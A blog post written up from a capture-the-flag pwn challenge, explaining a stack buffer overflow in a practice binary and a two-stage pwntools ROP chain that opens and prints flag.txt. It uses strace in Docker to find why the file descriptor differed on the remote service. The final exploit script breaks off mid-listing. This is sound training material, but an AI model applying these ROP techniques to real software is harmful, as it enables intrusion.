<!DOCTYPE html>
<html class="" lang="en-us"><head>
    
    <meta name="robots" content="noai, noimageai">
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            Tracing file descriptors: A battle against poor writeups  &ndash;
        
        ashtrace | blog
    </title>

    
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />

    
    
    <link type="text/css" rel="stylesheet" href=https://ashtrace.github.io/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
<meta name="author" content="Aishwarya Raj" />

    
        <meta name="keywords" content='ctf, linux, pwn, writeup' />
    
    
        <meta name="description" content="an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit against the remote challenge service and failed. Referring to the writeup document I found this:
There was no explanation regarding the value of file-descriptor. Thus I went on a quest to trace for the value." />
    

<meta property="og:site_name"
    content='ashtrace | blog' />

    <meta property="og:title" content="Tracing file descriptors: A battle against poor writeups" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="Aishwarya Raj" />
    
    <meta
        property="article:published_time"
        content='2024-10-05T00:09:08Z&#43;0530' />
    
        
            <meta property="article:tag" content="ctf" />
        
            <meta property="article:tag" content="linux" />
        
            <meta property="article:tag" content="pwn" />
        
            <meta property="article:tag" content="writeup" />
        
    
    <meta property="og:url" content="https://ashtrace.github.io/posts/tracing_file_descriptors/" />
    
    
    <meta property="og:image"
        content="https://ashtrace.github.io/icon512.png" />
    
        <meta property="og:description" content="I was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit " />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='ashtrace.github.io'
/>
<meta property="twitter:url" content="https://ashtrace.github.io/posts/tracing_file_descriptors/" />


    <meta name="twitter:title" content="Tracing file descriptors: A battle against poor writeups" />
    
    
    
    <meta name="twitter:image"
        content="https://ashtrace.github.io/icon512.png" />
    
        <meta name="twitter:description" content="I was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit " />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">ashtrace | blog</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts/">Posts</a></li>
        
        
        
        
        
        
        
            <li><a href="/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="/index.xml">
    
    
        &#xf09e;
    
    <span>
        RSS
    </span>
</a>

        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/ashtrace">
    
    
        &#xf09b;
    
    <span>
        GitHub
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>Tracing file descriptors: A battle against poor writeups</h1>
    
    
        <p class="date">
            <span title='Date'>󰃭 </span>
    2024-10-05


        </p>
    
    
    
    
    <div><p>I was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit against the remote challenge service and failed. Referring to the writeup document I found this:</p>
<p><img src="./writeup-remote-section.jpeg" alt="writeup-remote-section"></p>
<p>There was no explanation regarding the value of file-descriptor. Thus I went on a quest to trace for the value.</p>
<blockquote>
<p>PS: Please bear with me while we fight togther to tally all those numbers :)  (<em>I tried my best to redact challenge name</em>)</p>
</blockquote>
<h2 id="context-information">Context information</h2>
<p>We are provided with challenge ELF binary named <code>challengeBinary</code>, and a Dockerfile to create docker container with binary and fake flag.</p>
<h2 id="executable-mitigation-information">Executable Mitigation Information</h2>
<pre tabindex="0"><code>Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
</code></pre><h2 id="source-code-analysis-decompilation">Source code analysis (Decompilation)</h2>
<ul>
<li>
<p><strong>main()</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> s1[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+8h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [rsp+10h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">__int64</span> buf[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+34h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">banner</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(fd, buf, <span style="color:#ae81ff">8uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask screams some nonsense]: %s</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)s1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[Strange man in mask]: In order to proceed, tell us the secret phrase: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%16s&#34;</span>, s1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xE</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( s1[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        s1[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(s1, <span style="color:#e6db74">&#34;s34s0nf1n4l3b00&#34;</span>, <span style="color:#ae81ff">0xFuLL</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">challenge_function</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask]: Sorry, you are not allowed to enter here!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>The program opens up <code>/dev/random</code> at provides the user with 8 bytes of randomness</li>
<li>It asks for a secret phrase (compared with <code>s34s0nf1n4l3b00</code>), if the phrase matches
<ul>
<li>It calls <strong>challenge_function()</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>challenge_function()</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">challenge_function</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [%p]&#34;</span>, buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">[Strange man in mask]: Now, tell us a wish for next year: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdin);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(_bss_start);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Strange man in mask]: That&#39;s a nice wish! Let the Spooktober Spirit be with you!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x54uLL</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It discloses a stack address (of input buffer).</li>
<li>It reads 4096 bytes into a 64 byte array.</li>
</ul>
</li>
</ul>
<h2 id="vulnerability">Vulnerability</h2>
<p>As <code>NX</code> is enabled, but it is a No PIE binary, we can possibly ROP. <em>We also have stack address leak to store data</em> in our ropchain.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="exploit-development">Exploit Development</h3>
<p>We do not have a <code>pop rdi ; ret</code> gadget, but the moment <strong>challenge_function()</strong> returns, RDX stores 0x54 which would suffice for us, if flag is larger in size we would have to read it in 84 byte chunks, <em>not an issue :)</em>.</p>
<p>The call to <strong>open()</strong> sets RDX to 0, so we return back to <strong>challenge_function()</strong> and send a second ropchain to read the flag from opened file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./challengeBinary&#34;</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(exe)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>process(exe)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;s34s0nf1n4l3b00&#34;</span>)   <span style="color:#75715e"># secret phrase</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [&#34;</span>)
</span></span><span style="display:flex;"><span>buffer_address <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Buffer&#39;s stack address provided: </span><span style="color:#e6db74">{</span>hex(buffer_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># GADGETS =====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f2</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>open_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010e0</span>
</span></span><span style="display:flex;"><span>read_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>
</span></span><span style="display:flex;"><span>write_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401050</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>   <span style="color:#75715e"># buffer size + RBP size</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage1 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>: [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (padding <span style="color:#f92672">-</span> len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(open_plt),      <span style="color:#75715e"># open(&#34;flag.txt&#34;, O_RDONLY), file descriptor returned for &#34;flag.txt&#34; would be 3 if program closed all the files it had opened before this call</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;finale&#34;</span>])
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})  <span style="color:#75715e"># call to open() sets RDX to 0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage1)
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readrepeat(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ropchain_stage2 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    padding: [
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">3</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(read_plt),      <span style="color:#75715e"># read(3, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rdi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">1</span>),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(pop_rsi),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(buffer_address),
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(write_plt),     <span style="color:#75715e"># write(stdout, buffer, 84)</span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(ropchain_stage2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;That&#39;s a nice wish! Let the Spooktober Spirit be with you!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;FLAG: </span><span style="color:#e6db74">{</span>proc<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>The script worked locally, but failed on remote instance.</p>
<h3 id="troubleshooting">Troubleshooting</h3>
<p>I made slight change to the Dockerfile to install <code>strace</code> and use it to trace my calls</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:20.04</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> DEBIAN_FRONTEND noninteractive<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update --fix-missing <span style="color:#f92672">&amp;&amp;</span> apt-get -y upgrade<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get install -y socat strace<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> useradd -m ctf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/* /home/ctf/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chown -R ctf:ctf /home/ctf/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /home/ctf</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> ctf</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 9001/tcp</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;strace&#34;</span>, <span style="color:#e6db74">&#34;-f&#34;</span>, <span style="color:#e6db74">&#34;socat&#34;</span>, <span style="color:#e6db74">&#34;TCP-LISTEN:9001,fork&#34;</span>, <span style="color:#e6db74">&#34;EXEC:&#39;./challengeBinary&#39;&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>When I ran my exploit against the docker container, I observed that contrary to my assumption of fd being <code>3</code>, <strong>when flag.txt was opened it was assigned <code>5</code> fd number</strong>.</p>
<pre tabindex="0"><code>~$ docker run -it -p 9001:9001 --rm --name=challengeBinary challenge | grep open

openat(AT_FDCWD, &#34;/etc/ld.so.cache&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libwrap.so.0&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libutil.so.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libssl.so.1.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libcrypto.so.1.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libc.so.6&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libnsl.so.1&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libpthread.so.0&#34;, O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libdl.so.2&#34;, O_RDONLY|O_CLOEXEC) = 3
[pid    11] openat(AT_FDCWD, &#34;/etc/ld.so.cache&#34;, O_RDONLY|O_CLOEXEC) = 5
[pid    11] openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libc.so.6&#34;, O_RDONLY|O_CLOEXEC) = 5
[pid    11] openat(AT_FDCWD, &#34;/dev/urandom&#34;, O_RDONLY &lt;unfinished ...&gt;
[pid    11] &lt;... openat resumed&gt;)       = 5
[pid    11] openat(AT_FDCWD, &#34;flag.txt&#34;, O_RDONLY &lt;unfinished ...&gt;
[pid    11] &lt;... openat resumed&gt;)       = 5
</code></pre><p>Updating the exploit script, it worked for remote instance</p>
<h3 id="final-exploit-script">Final exploit script</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./challengeBinary&#34;</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(exe)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#34;83.136.251.168&#34;</span>, <span style="color:#ae81ff">39139</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;s34s0nf1n4l3b00&#34;</span>)   <span style="color:#75715e"># secret phrase</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [&#34;</span>)
</span></span><span style="display:flex;"><span>buffer_address <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Buffer&#39;s stack address provided: </span><span style="color:#e6db74">{</span>hex(buffer_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># GADGETS =====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f2</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011f4</span>
</span></span><span style="display:flex;"><span>
